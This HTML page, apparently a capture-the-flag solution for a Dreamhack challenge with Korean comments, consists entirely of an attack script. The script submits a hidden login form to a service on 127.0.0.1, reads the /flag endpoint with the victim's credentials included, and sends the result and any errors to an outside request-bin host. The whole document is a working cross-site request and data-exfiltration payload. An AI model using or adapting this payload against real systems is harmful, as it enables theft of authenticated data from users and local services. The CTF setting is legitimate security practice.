<!doctype html>
<html>
<body>
<script>
(async () => {
  const exfil = "https://yxozfwj.request.dreamhack.games";
  const username = "attacker";
  const password = "pw123";

  // 1) 로그인 (127.0.0.1 기준이라 admin 세션 생성)
  const form = document.createElement("form");
  form.action = "http://127.0.0.1:3000/login";
  form.method = "POST";
  form.target = "hiddenwin";
  form.innerHTML = `<input name="username" value="${username}"><input name="password" value="${password}">`;
  document.body.appendChild(form);
  window.open("about:blank", "hiddenwin");
  form.submit();

  // 2) 세션 생성 후 플래그 요청 -> 그대로 리퀘스트빈으로 프록시
  setTimeout(async () => {
    try {
      const flag = await fetch("http://127.0.0.1:3000/flag", { credentials: "include", mode: "cors" })
        .then(r => r.text());
      await fetch(`${exfil}?f=${encodeURIComponent(flag)}`);
    } catch (e) {
      fetch(`${exfil}?err=${encodeURIComponent(e.message || "fail")}`);
    }
  }, 400);
})();
</script>
</body>
</html>
